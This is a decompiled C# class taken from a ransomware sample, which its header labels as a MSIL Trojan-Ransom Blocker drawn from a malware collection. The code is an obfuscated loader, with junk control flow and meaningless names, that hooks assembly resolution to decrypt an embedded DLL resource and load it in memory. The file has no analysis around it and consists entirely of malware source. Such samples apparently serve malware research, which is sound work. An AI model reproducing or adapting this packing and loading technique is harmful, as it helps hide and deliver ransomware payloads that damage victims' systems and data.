// Decompiled with JetBrains decompiler
// Type: Esulsglfyznb.a
// Assembly: ConsoleApp6, Version=5.30.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E3023E09-FA1F-4896-E8F5-06AD3FD474BE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-7f03d6f5a38d18082c3dd60b773921aecd203a839446a4aca4908309a004b4a4.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace Esulsglfyznb
{
  public sealed class a
  {
    protected Dictionary<string, ArrayList> a;
    private object b;

    public a()
    {
      Dictionary<string, ArrayList> dictionary = new Dictionary<string, ArrayList>();
      if (true)
        goto label_4;
label_1:
      if (true)
        goto label_5;
label_2:
      if (false)
        return;
      this.a();
      return;
label_5:
      this.a((object) this);
      goto label_2;
label_4:
      this.a = dictionary;
      goto label_1;
    }

    public object a()
    {
      if (true)
        ;
      return this.b;
    }

    public void a(object a)
    {
      object obj = a;
      if (false)
        return;
      this.b = obj;
    }

    public void a()
    {
      AppDomain currentDomain = AppDomain.CurrentDomain;
      ResolveEventHandler resolveEventHandler1 = Esulsglfyznb.a.a.b;
      if (resolveEventHandler1 == null)
      {
        ResolveEventHandler resolveEventHandler2 = new ResolveEventHandler(Esulsglfyznb.a.a.a.a);
        if (false)
        {
          resolveEventHandler1 = resolveEventHandler2;
        }
        else
        {
          Esulsglfyznb.a.a.b = resolveEventHandler2;
          resolveEventHandler1 = resolveEventHandler2;
        }
      }
      currentDomain.AssemblyResolve += resolveEventHandler1;
    }

    public void a(string a, Esulsglfyznb.a.d b)
    {
      if (true)
        ;
      Dictionary<string, ArrayList> a1 = this.a;
      string key = a;
      if (true)
        ;
      ArrayList arrayList;
      ref ArrayList local = ref arrayList;
      if (!a1.TryGetValue(key, out local))
      {
        if (true)
          ;
        this.a.Add(a, new ArrayList());
      }
      this.a[a].Add((object) b);
    }

    public void a(string a, Esulsglfyznb.a.c b)
    {
      Esulsglfyznb.a.b b1 = new Esulsglfyznb.a.b();
      if (true)
        goto label_4;
label_1:
      Esulsglfyznb.a.b b2;
      Esulsglfyznb.a.b b3 = b2;
      Esulsglfyznb.a.c c = b;
      if (true)
        goto label_5;
label_2:
      string a1 = a;
      Esulsglfyznb.a.d b4 = new Esulsglfyznb.a.d(b2.a);
      if (false)
        return;
      this.a(a1, b4);
      return;
label_5:
      b3.a = c;
      goto label_2;
label_4:
      b2 = b1;
      goto label_1;
    }

    public void a(string a)
    {
      if (true)
        ;
      Dictionary<string, ArrayList> a1 = this.a;
      string key = a;
      if (true)
        ;
      ArrayList arrayList;
      ref ArrayList local = ref arrayList;
      if (!a1.TryGetValue(key, out local))
        return;
      if (true)
        ;
      this.a.Remove(a);
    }

    public void b(string a)
    {
      ArrayList arrayList;
      if (!this.a.TryGetValue(a, out arrayList))
        return;
      IEnumerator enumerator1 = arrayList.GetEnumerator();
      IEnumerator enumerator2;
      if (true)
        enumerator2 = enumerator1;
      try
      {
        while (enumerator2.MoveNext())
          ((Esulsglfyznb.a.d) enumerator2.Current)(this.a());
      }
      finally
      {
        IDisposable disposable1 = enumerator2 as IDisposable;
        if (true)
          goto label_10;
label_8:
        IDisposable disposable2;
        disposable2?.Dispose();
label_10:
        disposable2 = disposable1;
        goto label_8;
      }
    }

    [Serializable]
    private sealed class a
    {
      public static readonly Esulsglfyznb.a.a a;
      public static ResolveEventHandler b;

      static a()
      {
        Esulsglfyznb.a.a a = new Esulsglfyznb.a.a();
        if (false)
          return;
        Esulsglfyznb.a.a.a = a;
      }

      public a()
      {
        if (true)
          ;
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal Assembly a(object a, ResolveEventArgs b)
      {
        if (true)
          goto label_2;
label_1:
        string name;
        Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
        Stream stream;
        if (true)
          stream = manifestResourceStream;
        try
        {
          byte[] numArray1 = new byte[stream.Length];
          if (true)
            goto label_6;
label_5:
          byte[] numArray2;
          stream.Read(numArray2, 0, numArray2.Length);
          return Assembly.Load(new e().b(numArray2));
label_6:
          numArray2 = numArray1;
          goto label_5;
        }
        finally
        {
          stream?.Dispose();
        }
label_2:
        name = "Esulsglfyznb.Gcalmuzpmqwmccg.dll";
        goto label_1;
      }
    }

    private sealed class b
    {
      public Esulsglfyznb.a.c a;

      public b()
      {
        if (true)
          ;
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal void a(object a)
      {
        if (true)
          ;
        this.a();
      }
    }

    public delegate void c();

    public delegate void d(object a);
  }
}
